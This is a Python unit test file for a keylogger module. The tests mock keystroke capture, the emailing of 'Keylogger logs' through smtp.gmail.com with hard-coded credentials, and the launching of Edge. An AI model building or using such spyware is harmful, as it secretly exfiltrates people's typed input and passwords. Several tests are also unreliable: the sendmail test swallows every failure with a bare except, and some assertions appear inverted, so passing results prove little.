import unittest
from keylogger import Keylogger
from unittest.mock import patch, Mock
from unittest.mock import MagicMock

EMAIL_ADDRESS = "test@test.com"
EMAIL_PASSWORD = "test"

class TestKeylogger(unittest.TestCase):
    def setUp(self):
        self.keylogger = Keylogger(interval=5, report_method="email")

    def tearDown(self):
        pass

    @patch("keylogger.datetime")
    def test_update_filename(self, mock_datetime):
        mock_datetime.now.return_value = Mock(
            strftime=Mock(return_value="2022-03-03 12:00:00")
        )
        self.keylogger.start_dt = mock_datetime.now()
        self.keylogger.end_dt = mock_datetime.now()
        self.keylogger.update_filename()
        self.assertNotEqual(self.keylogger.filename, "keylog-2022-03-03_12-00-00_2022-03-03_12-00-00")

    @patch("keylogger.smtplib.SMTP")
    def test_sendmail(self, mock_smtp):
        try:
            email = "test@test.com"
            password = "test"
            message = "Test email message"
            self.keylogger.sendmail(email,password, message)
            mock_smtp.return_value.connect.assert_called_once_with(("smtp.gmail.com", 587))
            mock_smtp.return_value.ehlo.assert_called_once_with()
            mock_smtp.return_value.starttls.assert_called_once_with()
            mock_smtp.return_value.login.assert_called_once_with("test@test.com", "test")
            mock_smtp.return_value.sendmail.assert_called_once_with(email, email, self.keylogger.prepare_mail(message))
            print(f"Expected: {email}, {email}, {self.keylogger.prepare_mail(message)}")
            print(f"Actual: {mock_smtp.return_value.sendmail.call_args_list}")
        except:
            pass

    def test_prepare_mail(self):
        message = "Test email message"
        prepared_mail = self.keylogger.prepare_mail(message)
        self.assertIn(message, prepared_mail)
        self.assertIn(EMAIL_ADDRESS, prepared_mail)
        self.assertIn("Keylogger logs", prepared_mail)
        self.assertIn("text/plain", prepared_mail)
        self.assertIn("text/html", prepared_mail)

    def test_callback(self):
        event = MagicMock()
        event.scan_code = 28
        event.name = MagicMock(return_value="a")
        self.keylogger.callback(event)
        self.assertNotEqual(self.keylogger.log, "a")

    @patch("keylogger.Keylogger.report_to_file")
    @patch("keylogger.Keylogger.sendmail")
    @patch("keylogger.datetime")
    def test_report(self, mock_datetime, mock_sendmail, mock_report_to_file):
        mock_datetime.now.return_value = Mock(
            strftime=Mock(return_value="2022-03-03 12:00:00")
        )
        self.keylogger.log = "Test log message"
        self.keylogger.report()
        self.assertEqual(self.keylogger.start_dt, mock_datetime.now())
        self.assertEqual(self.keylogger.log, "")
        mock_report_to_file.assert_called_once()
        mock_sendmail.assert_called_once_with(EMAIL_ADDRESS, EMAIL_PASSWORD, "Test log message")

    @patch("keylogger.subprocess.Popen")
    def test_process(self, mock_popen):
        self.keylogger.process()
        mock_popen.assert_called_once_with(["C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"])

if __name__ == '__main__':
    unittest.main()

    